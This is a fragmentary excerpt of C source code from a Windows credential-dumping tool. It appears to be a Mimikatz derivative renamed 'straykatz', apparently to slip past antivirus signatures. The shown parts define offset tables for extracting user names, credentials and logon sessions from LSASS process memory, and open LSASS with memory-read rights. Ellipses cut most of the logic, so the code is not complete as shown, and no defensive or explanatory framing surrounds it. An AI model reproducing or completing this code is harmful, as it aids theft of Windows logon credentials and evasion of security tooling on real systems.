...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	...
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_straykatz), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_straykatz, LogonServer)},
...
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	...
	DWORD processRights = PROCESS_VM_READ | ((straykatz_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;
	PBYTE pSk;
			...
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				...
				else
				{
					...
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(straykatz L" " straykatz_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = straykatz_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = straykatz_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = straykatz_NT_BUILD_NUMBER;
					}
				}
...
#pragma warning(pop)
	...
	{
		if(straykatz_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
